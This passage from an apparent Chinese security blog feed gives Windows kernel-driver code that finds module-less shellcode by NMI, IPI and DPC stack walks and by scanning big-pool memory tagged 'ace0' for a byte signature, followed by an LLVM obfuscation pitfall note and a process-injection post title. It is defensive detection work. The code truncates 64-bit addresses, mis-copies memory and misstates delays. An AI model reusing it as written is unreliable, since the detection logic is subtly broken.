获取CPU逻辑核心数量</span></span><br><span class="line">    ProcessorCount = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册NMI回调函数</span></span><br><span class="line">    NmiCallbackHandle = KeRegisterNmiCallback(NmiCallbackForCheck, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!NmiCallbackHandle) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;Failed to register NMI callback\n&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    PVOID shellcodeaddr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (!found) &#123;</span><br><span class="line">        <span class="keyword">for</span> (CCHAR i = <span class="number">0</span>; i &lt; (CCHAR)ProcessorCount &amp;&amp; !found; ++i) &#123;</span><br><span class="line">            KeInitializeAffinityEx(&amp;NmiAffinity);</span><br><span class="line">            KeAddProcessorAffinityEx(&amp;NmiAffinity, i);</span><br><span class="line">            kprintf((<span class="string">&quot;Registered NMI for processor %d\n&quot;</span>, i));</span><br><span class="line">            HalSendNMI(&amp;NmiAffinity);</span><br><span class="line">            LARGE_INTEGER inTime;</span><br><span class="line">            inTime.QuadPart = <span class="number">10</span> * <span class="number">-10000</span>; <span class="comment">// 1 second delay</span></span><br><span class="line">            KeDelayExecutionThread(KernelMode, FALSE, &amp;inTime);</span><br><span class="line">            <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; numFrames; i++) &#123;</span><br><span class="line">                <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; CountOfModule; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((ULONG)callers[i] &gt;= (ULONG)ModuleBase[j] &amp;&amp; (ULONG)callers[i] &lt; ((ULONG)ModuleBase[j] + ModuleSize[j])) &#123;</span><br><span class="line">                        flag = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    found = <span class="number">1</span>;</span><br><span class="line">                    shellcodeaddr = callers[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">                kprintf((<span class="string">&quot;shellcode not found in current NMI\n&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;shellcode found in %p\n&quot;</span>), shellcodeaddr);</span><br><span class="line"></span><br><span class="line">    KeDeregisterNmiCallback(NmiCallbackHandle);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">GetAllModule</span><span class="params">()</span> &#123;</span><br><span class="line">    LDR_DATA_TABLE_ENTRY *TE, *Tmp;</span><br><span class="line">    TE = (LDR_DATA_TABLE_ENTRY*)g_Object-&gt;DriverSection;</span><br><span class="line">    PLIST_ENTRY LinkList;</span><br><span class="line">    ;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    LinkList = TE-&gt;InLoadOrderLinks.Flink;  </span><br><span class="line">    <span class="keyword">while</span> (LinkList != &amp;TE-&gt;InLoadOrderLinks)</span><br><span class="line">    &#123;</span><br><span class="line">        Tmp = (LDR_DATA_TABLE_ENTRY*)LinkList;</span><br><span class="line">        ModuleBase[i] = (UINT64)(Tmp-&gt;DllBase);</span><br><span class="line">        ModuleSize[i] = (UINT64)(Tmp-&gt;SizeOfImage);</span><br><span class="line">        <span class="comment">//kprintf((&quot;%S:%p~%p\n&quot;),Tmp-&gt;BaseDllName.Buffer,Tmp-&gt;DllBase,(ULONG)(Tmp-&gt;DllBase)+(ULONG)(Tmp-&gt;SizeOfImage));</span></span><br><span class="line">        LinkList = LinkList-&gt;Flink;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    CountOfModule = i;</span><br><span class="line">    ULONG Size = (ULONG)(g_Object-&gt;DriverSize);<span class="comment">//把自身的地址和大小也加进去</span></span><br><span class="line">    ModuleBase[CountOfModule] = g_Object-&gt;DriverStart;</span><br><span class="line">    ModuleSize[CountOfModule++] = Size;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Hello xia0ji233\n&quot;</span>)); </span><br><span class="line">    pDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class="line">    g_Object = pDriver;</span><br><span class="line">    GetAllModule();</span><br><span class="line">    NTSTATUS status = NMISearch();</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;NMICallBack failed with status 0x%x\n&quot;</span>, status));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>向所有 CPU 发送 NMI，打断CPU执行，执行栈回溯，保存下栈的值，NMI 响应完成之后马上去分析栈的值，是否有不在模块范围内的值，如果有就直接输出，说明找到了 shellcode。</p><p>需要注意的是，因为自身驱动加载的过程中，还没有加载进去，因此遍历模块的时候需要额外加上自身模块的地址，否则容易找到正在执行的 DriverEntry。自身模块的地址和大小可以使用 <code>pDriver-&gt;Start</code> 和 <code>pDriver-&gt;DriverSize</code> 获得。</p><p>执行结果：</p><img src="/2024/06/28/driver13/1.png" class=""><p>NMI 回调中，返回 0 会直接蓝屏，返回 1 则会继续处理。并且 NMI 中断优先级很高，保存栈情况即可，不要调用 DbgPrint 和其它一些操作。</p><h3 id="IPI"><a href="#IPI" class="headerlink" title="IPI"></a>IPI</h3><p><strong>处理器间中断</strong>（英语：Inter-Processor Interrupt，IPI）是一种特殊类型的中断，即在多处理器系统中，如果中断处理器需要来自其它处理器的动作，一个处理器向另一个处理器发出的中断行为。</p><p>IPI 同样是一种高优先级的中断，方法也几乎是一模一样的，只需要调用 API KeIpiGenericCall 就可以让所有的核心都打断执行同一个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR <span class="title function_">IpiBroadcastFunction</span><span class="params">(ULONG_PTR Argument)</span> &#123;</span><br><span class="line">    numFrames = RtlWalkFrameChain(callers,count,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">IPISearch</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    PVOID shellcodeaddr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (!found) &#123;</span><br><span class="line">        KeIpiGenericCall(IpiBroadcastFunction, <span class="literal">NULL</span>);</span><br><span class="line">        LARGE_INTEGER inTime;</span><br><span class="line">        inTime.QuadPart = <span class="number">10</span> * <span class="number">-10000</span>; <span class="comment">// 10 ms delay</span></span><br><span class="line">        KeDelayExecutionThread(KernelMode, FALSE, &amp;inTime);</span><br><span class="line">        <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; numFrames; i++) &#123;</span><br><span class="line">            <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; CountOfModule; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((ULONG)callers[i] &gt;= (ULONG)ModuleBase[j] &amp;&amp; (ULONG)callers[i] &lt; ((ULONG)ModuleBase[j] + ModuleSize[j])) &#123;</span><br><span class="line">                    flag = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                found = <span class="number">1</span>;</span><br><span class="line">                shellcodeaddr = callers[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            kprintf((<span class="string">&quot;shellcode not found in current IPI\n&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;shellcode found in %p\n&quot;</span>), shellcodeaddr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="DPC"><a href="#DPC" class="headerlink" title="DPC"></a>DPC</h3><p>即延时过程调用，它同样可以打断正在执行的CPU。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">ULONG_PTR <span class="title function_">DPCRountine</span><span class="params">(ULONG_PTR Argument)</span> &#123;</span><br><span class="line">    numFrames = RtlWalkFrameChain(callers,count,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DPC1Search</span><span class="params">()</span> &#123;</span><br><span class="line">    ULONG ProcessorCount = <span class="number">0</span>;</span><br><span class="line">    KDPC Dpc;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    PVOID shellcodeaddr = <span class="literal">NULL</span>;</span><br><span class="line">    ProcessorCount = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS);</span><br><span class="line">    <span class="keyword">while</span> (!found) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (CCHAR i = <span class="number">0</span>; i &lt; (CCHAR)ProcessorCount &amp;&amp; !found; ++i) &#123;</span><br><span class="line">            KeInitializeDpc(&amp;Dpc, DPCRountine, <span class="literal">NULL</span>);</span><br><span class="line">            KeSetTargetProcessorDpc(&amp;Dpc, i);</span><br><span class="line">            KeInsertQueueDpc(&amp;Dpc, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">            KeFlushQueuedDpcs();</span><br><span class="line">            <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; numFrames; i++) &#123;</span><br><span class="line">                <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; CountOfModule; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((ULONG)callers[i] &gt;= (ULONG)ModuleBase[j] &amp;&amp; (ULONG)callers[i] &lt; ((ULONG)ModuleBase[j] + ModuleSize[j])) &#123;</span><br><span class="line">                        flag = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                    found = <span class="number">1</span>;</span><br><span class="line">                    shellcodeaddr = callers[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">                kprintf((<span class="string">&quot;shellcode not found in current DPC\n&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            LARGE_INTEGER inTime;</span><br><span class="line">            inTime.QuadPart = <span class="number">10</span> * <span class="number">-10000</span>; <span class="comment">// 1 second delay</span></span><br><span class="line">            KeDelayExecutionThread(KernelMode, FALSE, &amp;inTime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;shellcode found in %p\n&quot;</span>), shellcodeaddr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BigPool扫描"><a href="#BigPool扫描" class="headerlink" title="BigPool扫描"></a>BigPool扫描</h3><p>通过字节特征码去比对 tag 为 ‘ace0’ 的内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SystemBigPoolInformation 66</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(*ZWQUERYSYSTEMINFORMATION)</span><span class="params">(ULONG, PVOID, ULONG, PULONG)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_BIGPOOL_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID VirtualAddress;</span><br><span class="line">        ULONG_PTR NonPaged : <span class="number">1</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG_PTR SizeInBytes;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        UCHAR Tag[<span class="number">4</span>];</span><br><span class="line">        ULONG TagUlong;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_BIGPOOL_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG Count;</span><br><span class="line">    SYSTEM_BIGPOOL_ENTRY AllocatedInfo[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;</span><br><span class="line"></span><br><span class="line">VOID <span class="title function_">DRIVERUNLOAD</span><span class="params">(_In_ <span class="keyword">struct</span> _DRIVER_OBJECT* DriverObject)</span></span><br><span class="line">&#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(DriverObject);</span><br><span class="line">    kprintf(<span class="string">&quot;unload\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PVOID <span class="title function_">FindPattern</span><span class="params">(PUCHAR base, ULONG length, PCUCHAR pattern, ULONG patternLength)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; length - patternLength; i++) &#123;</span><br><span class="line">        BOOLEAN found = TRUE;</span><br><span class="line">        <span class="keyword">for</span> (ULONG j = <span class="number">0</span>; j &lt; patternLength; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pattern[j] != base[i + j]) &#123;</span><br><span class="line">                found = FALSE;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (found) &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;base[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">BigPoolSearch</span><span class="params">()</span> &#123;</span><br><span class="line">    ULONG poolInformationLength = <span class="number">0x50000</span>;</span><br><span class="line">    UNICODE_STRING routineName;</span><br><span class="line">    RtlInitUnicodeString(&amp;routineName, <span class="string">L&quot;ZwQuerySystemInformation&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)MmGetSystemRoutineAddress(&amp;routineName);</span><br><span class="line">    <span class="keyword">if</span> (!ZwQuerySystemInformation) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Failed to get ZwQuerySystemInformation address\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    PVOID poolInformation = ExAllocatePoolWithTag(NonPagedPool, poolInformationLength, <span class="string">&#x27;ace0&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!poolInformation) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Failed to allocate pool information buffer\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    status = ZwQuerySystemInformation(SystemBigPoolInformation, poolInformation, poolInformationLength, &amp;poolInformationLength);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;Failed to query pool information\n&quot;</span>);</span><br><span class="line">        ExFreePoolWithTag(poolInformation, <span class="string">&#x27;ace0&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PSYSTEM_BIGPOOL_INFORMATION bigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)poolInformation;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; bigPoolInfo-&gt;Count; i++) &#123;</span><br><span class="line">        PSYSTEM_BIGPOOL_ENTRY entry = &amp;bigPoolInfo-&gt;AllocatedInfo[i];</span><br><span class="line">        <span class="keyword">if</span> (entry-&gt;TagUlong == <span class="string">&#x27;ace0&#x27;</span>) &#123;</span><br><span class="line">            ULONG_PTR lpAddress = (ULONG_PTR)(entry-&gt;VirtualAddress) &amp; (~<span class="number">1ull</span>);</span><br><span class="line">            kprintf(<span class="string">&quot;Pool Entry: Address=%p, Size=%llu, Tag=&#x27;%c%c%c%c&#x27;\n&quot;</span>,</span><br><span class="line">                lpAddress,</span><br><span class="line">                entry-&gt;SizeInBytes,</span><br><span class="line">                entry-&gt;Tag[<span class="number">3</span>],</span><br><span class="line">                entry-&gt;Tag[<span class="number">2</span>],</span><br><span class="line">                entry-&gt;Tag[<span class="number">1</span>],</span><br><span class="line">                entry-&gt;Tag[<span class="number">0</span>]);</span><br><span class="line">            ULONG SizeCopied;</span><br><span class="line">            MM_COPY_ADDRESS MmCopyAddress;</span><br><span class="line">            PVOID Buffer = ExAllocatePool(NonPagedPoolNx, entry-&gt;SizeInBytes);</span><br><span class="line">            MmCopyAddress.VirtualAddress = Buffer;</span><br><span class="line">            status = MmCopyMemory(Buffer, MmCopyAddress, entry-&gt;SizeInBytes, MM_COPY_MEMORY_VIRTUAL, &amp;SizeCopied);</span><br><span class="line">            <span class="keyword">if</span> (NT_SUCCESS(status)) &#123;</span><br><span class="line">                UCHAR pattern[] = &#123; <span class="number">0x41</span>, <span class="number">0xB8</span>, <span class="number">0xCE</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line">                PVOID res=FindPattern(lpAddress, entry-&gt;SizeInBytes, pattern, <span class="number">6</span>);</span><br><span class="line">                <span class="keyword">if</span> (res) &#123;</span><br><span class="line">                    kprintf((<span class="string">&quot;shellcode Found in address %p\n&quot;</span>), lpAddress);</span><br><span class="line">                    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ExFreePoolWithTag(poolInformation, <span class="string">&#x27;ace0&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span> &#123;</span><br><span class="line">    UNREFERENCED_PARAMETER(pReg);</span><br><span class="line">    kprintf(<span class="string">&quot;Hello xia0ji233\n&quot;</span>); </span><br><span class="line"></span><br><span class="line">    pDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class="line">    g_Object = pDriver;</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = BigPoolSearch();</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS(status)) &#123;</span><br><span class="line">        kprintf(<span class="string">&quot;BigPoolSearch failed with status 0x%x\n&quot;</span>, status);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://bbs.kanxue.com/thread-281459.htm">https://bbs.kanxue.com/thread-281459.htm</a></li></ul>]]></content>
    
    
    <summary type="html">驱动层捕获无模块shellcode。</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="Driver" scheme="https://xia0ji233.github.io/categories/Windows/Driver/"/>
    
    
  </entry>
  
  <entry>
    <title>LLVM排坑</title>
    <link href="https://xia0ji233.github.io/2024/06/21/LLVM%E6%8E%92%E5%9D%91/"/>
    <id>https://xia0ji233.github.io/2024/06/21/LLVM%E6%8E%92%E5%9D%91/</id>
    <published>2024-06-21T14:00:00.000Z</published>
    <updated>2024-06-21T14:18:22.699Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下LLVM踩的坑</p><span id="more"></span><p>LLVM遇到什么坑都更新在这里，防止其它师傅踩&amp;二次自己踩。</p><h2 id="ConstantFP"><a href="#ConstantFP" class="headerlink" title="ConstantFP"></a>ConstantFP</h2><p>在测试 OLLVM BogusControlFlow 的代码的时候遇到了下面两条指令：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Value *LHS = ConstantFP::<span class="built_in">get</span>(Type::<span class="built_in">getFloatTy</span>(F.<span class="built_in">getContext</span>()), <span class="number">1.0</span>);</span><br><span class="line">Value *RHS = ConstantFP::<span class="built_in">get</span>(Type::<span class="built_in">getFloatTy</span>(F.<span class="built_in">getContext</span>()), <span class="number">1.0</span>);</span><br></pre></td></tr></table></figure><p>直接会被阻塞，运行起来看上去像死循环了一样。原理还没弄清楚，暂时可行的方法就是不使用 ConstantFP 而是使用 ConstantInt 去构造不透明谓词[1]。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="http://www.qfrost.com/posts/llvm/llvmollvm%E6%8E%92%E5%9D%91%E4%BC%98%E5%8C%96/">http://www.qfrost.com/posts/llvm/llvmollvm%E6%8E%92%E5%9D%91%E4%BC%98%E5%8C%96/</a></li></ul>]]></content>
    
    
    <summary type="html">记录一下LLVM踩的坑</summary>
    
    
    
    <category term="Compiler" scheme="https://xia0ji233.github.io/categories/Compiler/"/>
    
    <category term="LLVM" scheme="https://xia0ji233.github.io/categories/Compiler/LLVM/"/>
    
    
    <category term="LLVM" scheme="https://xia0ji233.github.io/tags/LLVM/"/>
    
  </entry>
  
  <entry>
    <title>关于64位进程注入32位进程的分析</title>
    <link href="https://xia0ji233.github.io/2024/06/18/RemoteThreadInject/"/>
    <id>https://xia0ji233.github.io/2024/06/18/RemoteThreadInject/</id>
    <published>2024-06-18T03:00:00.000Z</published>
    <updated>2024-06-18T03:25:51.710Z</updated>
    
